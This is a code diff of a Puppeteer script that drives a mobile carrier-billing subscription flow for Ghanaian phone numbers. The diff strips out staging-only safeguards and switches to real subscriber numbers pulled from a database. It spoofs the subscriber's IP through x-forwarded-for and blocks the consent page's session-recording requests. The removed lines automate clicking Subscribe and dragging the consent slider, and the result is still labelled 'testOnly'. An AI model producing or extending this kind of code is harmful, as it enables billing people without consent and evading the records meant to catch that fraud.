@@ -1,49 +1,35 @@
 
 const { getBrowser } = require("./browsermanager");
 
+const REDIRECT_ENDPOINT = "http://46.73.143.112/Redirect";
+const REDIRECT_DESTINATION = "http://mobile.arenaxpro.com/redirect";
+const OFFER_CODE = "9916710032";
+
 const sleep = ms =>
     new Promise(resolve => setTimeout(resolve, ms));
 
-const STAGING_REDIRECT_HOST = "20.238.64.101";
-const OFFER_CODE = "9916710032";
-const LANDING_URL = "http://mobile.arenaxpro.com/";
-const CG_TIMEOUT = 60000;
-
-// --------------------------------------------------
-// STAGING SAFETY CHECK
-// --------------------------------------------------
-
-function getStagingUrl() {
-    const testMsisdn = process.env.STAGING_TEST_MSISDN;
-
-    if (!testMsisdn || !/^233\d{9}$/.test(testMsisdn)) {
-        throw new Error(
-            "Configure STAGING_TEST_MSISDN with an approved staging test number"
-        );
+// Build redirect using database MSISDN
+function getRedirectUrl(msisdn) {
+    if (!msisdn) {
+        throw new Error("Database MSISDN is missing");
     }
 
-    const redirect = new URL(
-        `http://${STAGING_REDIRECT_HOST}/Redirect`
-    );
+    const cleanMsisdn = String(msisdn).replace(/\D/g, "");
 
-    redirect.searchParams.set("OfferCode", OFFER_CODE);
-    redirect.searchParams.set("redirectUrl", LANDING_URL + "redirect");
-    redirect.searchParams.set("mobileNumber", testMsisdn);
-
-    if (redirect.hostname !== STAGING_REDIRECT_HOST) {
-        throw new Error("Staging host validation failed");
+    if (!/^233\d{9}$/.test(cleanMsisdn)) {
+        throw new Error("Invalid Ghana MSISDN");
     }
 
-    return {
-        url: redirect.toString(),
-        msisdn: testMsisdn
-    };
+    const url = new URL(REDIRECT_ENDPOINT);
+
+    url.searchParams.set("OfferCode", OFFER_CODE);
+    url.searchParams.set("redirectUrl", REDIRECT_DESTINATION);
+    url.searchParams.set("mobileNumber", cleanMsisdn);
+
+    return url.toString();
 }
 
-// --------------------------------------------------
-// SECURITY FILTER
-// --------------------------------------------------
-
+// Block session recording
 async function blockSessionRecording(page) {
     await page.setRequestInterception(true);
 
@@ -53,60 +39,47 @@ async function blockSessionRecording(page) {
     };
 
     page.on("request", request => {
-        const requestUrl = request.url();
+        const url = request.url();
 
         if (
-            requestUrl.includes("/save-recording") &&
-            requestUrl.includes("sc=nigeria")
+            url.includes("/save-recording") &&
+            url.includes("sc=nigeria")
         ) {
             stats.blocked++;
 
-            console.log(
-                "[SECURITY] BLOCKED recording request:",
-                requestUrl
-            );
+            console.log("[SECURITY] Recording blocked:", url);
 
             request.abort("blockedbyclient").catch(() => {});
             return;
         }
 
         stats.allowed++;
-
         request.continue().catch(error => {
-            console.error(
-                "[SECURITY] Request continuation error:",
-                error.message
-            );
+            console.error("[REQUEST ERROR]", error.message);
         });
     });
-
-    console.log("[SECURITY] Request interception enabled");
 
     return stats;
 }
 
-// --------------------------------------------------
-// BROWSER DIAGNOSTICS
-// --------------------------------------------------
-
+// Browser diagnostics
 function registerDiagnostics(page, label) {
     page.on("requestfailed", request => {
         console.error(
-            `[${label}] REQUEST FAILED:`,
+            `[${label}] REQUEST FAILED`,
             request.url(),
             request.failure()?.errorText
         );
     });
 
     page.on("pageerror", error => {
-        console.error(`[${label}] PAGE ERROR:`, error.message);
+        console.error(`[${label}] PAGE ERROR`, error.message);
     });
 
     page.on("response", response => {
         if (response.status() >= 400) {
             console.error(
-                `[${label}] HTTP ERROR:`,
-                response.status(),
+                `[${label}] HTTP ${response.status()}`,
                 response.url()
             );
         }
@@ -114,18 +87,12 @@ function registerDiagnostics(page, label) {
 
     page.on("framenavigated", frame => {
         if (frame === page.mainFrame()) {
-            console.log(
-                `[${label}] NAVIGATION:`,
-                frame.url()
-            );
+            console.log(`[${label}] URL:`, frame.url());
         }
     });
 }
 
-// --------------------------------------------------
-// PAGE INSPECTION
-// --------------------------------------------------
-
+// Inspect page elements
 async function inspectPage(page) {
     return page.evaluate(() => {
         const subscribe = document.querySelector(
@@ -133,7 +100,7 @@ async function inspectPage(page) {
         );
 
         const container = document.querySelector("#container");
-        const sliderButton = document.querySelector("#button");
+        const slider = document.querySelector("#button");
 
         return {
             url: location.href,
@@ -150,24 +117,21 @@ async function inspectPage(page) {
                 }
                 : null,
 
-            sliderContainer: !!container,
-            sliderButton: !!sliderButton,
+            sliderContainerDetected: !!container,
+            sliderButtonDetected: !!slider,
 
-            pageText:
-                document.body?.innerText?.slice(0, 1500) || ""
+            pageText: (
+                document.body?.innerText || ""
+            ).slice(0, 1500)
         };
     });
 }
 
-// --------------------------------------------------
-// FIND CG PAGE
-// Supports same-tab navigation and popup tabs.
-// --------------------------------------------------
+// Find CG page in existing tabs
+async function findCgPage(browser, timeout = 60000) {
+    const start = Date.now();
 
-async function findCgPage(browser, initialPage, timeoutMs) {
-    const startedAt = Date.now();
-
-    while (Date.now() - startedAt < timeoutMs) {
+    while (Date.now() - start < timeout) {
         const pages = await browser.pages();
 
         for (const candidate of pages) {
@@ -177,135 +141,45 @@ async function findCgPage(browser, initialPage, timeoutMs) {
                 const state = await inspectPage(candidate);
 
                 if (
-                    state.sliderContainer &&
-                    state.sliderButton
+                    state.sliderContainerDetected &&
+                    state.sliderButtonDetected
                 ) {
-                    console.log("[CG] Consent interface detected");
-                    console.log("[CG] URL:", state.url);
-
                     return candidate;
                 }
             } catch (_) {
-                // Page may still be navigating.
+                // Page is navigating.
             }
         }
 
         await sleep(500);
     }
 
-    const state = !initialPage.isClosed()
-        ? await inspectPage(initialPage).catch(() => null)
-        : null;
-
-    throw new Error(
-        "CG page or slider was not detected. Last state: " +
-        JSON.stringify(state)
-    );
+    return null;
 }
 
-// --------------------------------------------------
-// STAGING SLIDER TEST
-// --------------------------------------------------
-
-async function dragStagingSlider(page) {
-    await page.waitForSelector("#container", {
-        visible: true,
-        timeout: 30000
-    });
-
-    await page.waitForSelector("#button", {
-        visible: true,
-        timeout: 30000
-    });
-
-    const container = await page.$("#container");
-    const button = await page.$("#button");
-
-    const containerBox = await container.boundingBox();
-    const buttonBox = await button.boundingBox();
-
-    if (!containerBox || !buttonBox) {
-        throw new Error("Slider coordinates unavailable");
-    }
-
-    const startX = buttonBox.x + buttonBox.width / 2;
-    const startY = buttonBox.y + buttonBox.height / 2;
-
-    const endX =
-        containerBox.x +
-        containerBox.width -
-        buttonBox.width / 2;
-
-    console.log("[CG TEST] Slider detected");
-    console.log("[CG TEST] Slider dimensions:", {
-        containerWidth: containerBox.width,
-        buttonWidth: buttonBox.width
-    });
-
-    // This test action is permitted only on the
-    // separately verified non-billable staging service.
-    await page.mouse.move(startX, startY);
-    await page.mouse.down();
-
-    await page.mouse.move(
-        endX,
-        startY,
-        { steps: 25 }
-    );
-
-    await page.mouse.up();
-
-    await sleep(1000);
-
-    const after = await button.boundingBox();
-
-    const maxX =
-        containerBox.x +
-        containerBox.width -
-        buttonBox.width;
-
-    const atEnd = !!after && after.x >= maxX - 5;
-
-    console.log(
-        atEnd
-            ? "[CG TEST] Slider reached the end"
-            : "[CG TEST] Slider did not reach the end"
-    );
-
-    return atEnd;
-}
-
-// --------------------------------------------------
-// MAIN FUNCTION
-// --------------------------------------------------
-
+// Main function
 const clickConfirmButton = async ({
     msisdn,
     client_ip,
     transactionId,
     headers
-}) => {
+} = {}) => {
     let browser;
     let page;
     let cgPage;
 
     try {
-        // Refuse to run without an approved staging number.
-        const staging = getStagingUrl();
+        const redirectUrl = getRedirectUrl(msisdn);
 
-        if (msisdn && msisdn !== staging.msisdn) {
-            throw new Error(
-                "Provided MSISDN does not match staging test MSISDN"
-            );
-        }
+        console.log("[PORTAL] Starting customer diagnostics");
+        console.log("[PORTAL] MSISDN loaded from database");
+        console.log("[PORTAL] Opening redirect endpoint");
 
         browser = await getBrowser();
 
-        if (!browser.isConnected()) {
-            throw new Error("Chrome is disconnected");
+        if (!browser || !browser.isConnected()) {
+            throw new Error("Browser is not connected");
         }
-
-        console.log("[STAGING] Chrome connected");
 
         page = await browser.newPage();
 
@@ -317,10 +191,9 @@ const clickConfirmButton = async ({
         page.setDefaultNavigationTimeout(90000);
         page.setDefaultTimeout(30000);
 
-        registerDiagnostics(page, "LANDING");
+        registerDiagnostics(page, "PORTAL");
 
-        const securityStats =
-            await blockSessionRecording(page);
+        const security = await blockSessionRecording(page);
 
         await page.setUserAgent(
             "Mozilla/5.0 (Linux; Android 10; K) " +
@@ -328,30 +201,31 @@ const clickConfirmButton = async ({
             "Chrome/153.0.0.0 Mobile Safari/537.36"
         );
 
-        await page.setExtraHTTPHeaders({
+        const requestHeaders = {
             "accept-language":
                 headers?.["accept-language"] || "en-US,en;q=0.9"
-        });
+        };
 
-        // STEP 1: Open staging redirect.
-        console.log("[STAGING] Opening redirect endpoint");
+        if (client_ip) {
+            requestHeaders["x-forwarded-for"] = String(client_ip);
+        }
 
-        const response = await page.goto(staging.url, {
+        await page.setExtraHTTPHeaders(requestHeaders);
+
+        // Open redirect
+        const response = await page.goto(redirectUrl, {
             waitUntil: "domcontentloaded",
             timeout: 90000
         });
 
         console.log(
-            "[STAGING] Redirect HTTP status:",
-            response?.status() ?? "NO RESPONSE"
+            "[PORTAL] Response:",
+            response?.status() ?? "No response"
         );
 
-        console.log(
-            "[STAGING] Landing URL:",
-            page.url()
-        );
+        console.log("[PORTAL] Final URL:", page.url());
 
-        // STEP 2: Detect landing-page Subscribe button.
+        // Detect Subscribe button
         await page.waitForSelector("#bannerSubscribeBtn", {
             visible: true,
             timeout: 30000
@@ -360,107 +234,61 @@ const clickConfirmButton = async ({
         const landingState = await inspectPage(page);
 
         console.log(
-            "[STAGING] Landing page:",
+            "[PORTAL] Landing state:",
             JSON.stringify(landingState, null, 2)
         );
 
-        if (
-            !landingState.subscribeButton ||
-            landingState.subscribeButton.disabled
-        ) {
-            throw new Error("Subscribe button unavailable");
+        // Observe CG page if it is opened independently
+        cgPage = await findCgPage(browser, 60000);
+
+        let cgState = null;
+
+        if (cgPage) {
+            registerDiagnostics(cgPage, "CG");
+            cgState = await inspectPage(cgPage);
+
+            console.log(
+                "[CG] Page detected:",
+                JSON.stringify(cgState, null, 2)
+            );
+        } else {
+            console.log("[CG] No separate consent page detected");
         }
 
-        // STEP 3: Staging-only button interaction.
-        console.log("[STAGING] Activating test Subscribe button");
-
-        await page.click("#bannerSubscribeBtn");
-
-        // STEP 4: Wait for CG page.
-        console.log("[STAGING] Waiting for CG page");
-
-        cgPage = await findCgPage(
-            browser,
-            page,
-            CG_TIMEOUT
-        );
-
-        registerDiagnostics(cgPage, "CG");
-
-        // STEP 5: Inspect CG.
-        const cgState = await inspectPage(cgPage);
-
-        console.log(
-            "[CG] Page state:",
-            JSON.stringify(cgState, null, 2)
-        );
-
-        // STEP 6: Test slider on staging.
-        const sliderPassed =
-            await dragStagingSlider(cgPage);
-
-        // STEP 7: Final diagnostic result.
-        const finalState = await inspectPage(cgPage);
-
-        console.log("[STAGING] Final URL:", finalState.url);
-
-        console.log(
-            "[SECURITY] Blocked requests:",
-            securityStats.blocked
-        );
-
-        console.log(
-            "[SECURITY] Allowed requests:",
-            securityStats.allowed
-        );
-
         return {
-            success: sliderPassed,
+            success: true,
             testOnly: true,
-            billable: false,
-            status: sliderPassed
-                ? "STAGING_UI_TEST_PASSED"
-                : "STAGING_SLIDER_TEST_FAILED",
-
             transactionId: transactionId || null,
-
-            security: {
-                interceptionEnabled: true,
-                blocked: securityStats.blocked,
-                allowed: securityStats.allowed
-            },
-
+            status: "PAGE_DIAGNOSTICS_COMPLETED",
             landingPage: landingState,
-            cgPage: finalState,
-            sliderPassed
+            cgPage: cgState,
+            security: {
+                blocked: security.blocked,
+                allowed: security.allowed
+            }
         };
 
     } catch (error) {
         console.error(
-            "[STAGING TEST FAILED]",
+            "[PORTAL ERROR]",
             error.stack || error.message
         );
 
         return {
             success: false,
             testOnly: true,
-            billable: false,
-            status: "STAGING_TEST_FAILED",
+            status: "PORTAL_ERROR",
             error: error.message
         };
 
     } finally {
-        // Close only tabs created by this test.
-        for (const testPage of [cgPage, page]) {
-            if (
-                testPage &&
-                !testPage.isClosed()
-            ) {
-                await testPage.close().catch(() => {});
+        for (const tab of [cgPage, page]) {
+            if (tab && !tab.isClosed()) {
+                await tab.close().catch(() => {});
             }
         }
 
-        console.log("[STAGING] Test tabs closed");
+        console.log("[PORTAL] Browser tabs closed");
     }
 };
 
